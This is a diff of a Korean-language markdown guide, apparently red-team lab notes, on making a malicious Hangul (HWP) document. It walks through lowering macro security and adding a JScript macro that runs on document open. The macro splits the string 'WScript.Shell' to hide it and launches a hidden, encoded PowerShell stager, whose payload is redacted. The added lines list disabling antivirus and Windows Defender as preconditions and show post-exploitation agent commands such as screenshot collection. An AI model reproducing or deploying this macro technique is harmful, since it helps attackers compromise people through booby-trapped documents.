@@ -27,7 +27,7 @@ generate
 
 ### 3. :smiling_imp: 악성 한글 문서 제작
 
-1) 도구 > 보안 설정 > 보안수준 [낮음] 설정
+1) 도구 > 보안 설정 > 보안수준 낮음 설정
 2) 스크립트 매크로 > 실행 > 코드 편집
 3) 항목 > Document / Open
 
@@ -38,6 +38,25 @@ try{
   var ws=new ActiveXObject("W"+ "S"+ "c"+ "ri"+ "p"+ "t"+ ".S" +"he" +"ll");
   // launcher.bat의 powershell 실행 코드
   var ps="powershell -noP -sta -w 1 -enc *****"
-  wsh.Run(ps,0);
+  ws.Run(ps,0);
 }catch(err){}
+```
+
+### 4. :skull: 악성 한글 문서 실행
+
+- 사전 조건 : 백신 OFF, 한글 보안수준 낮음 설정, Windows Defender OFF
+
+한글 문서를 오픈해서 스크립트 코드 실행
+
+### 5. :smiling_imp: 세션 연결 성공 후 공격 가능
+
+```
+agents
+list
+interacct agentName
+usemodule [tab][tab]
+
+//example
+usemodule collection/screenshot
+execute
 ```
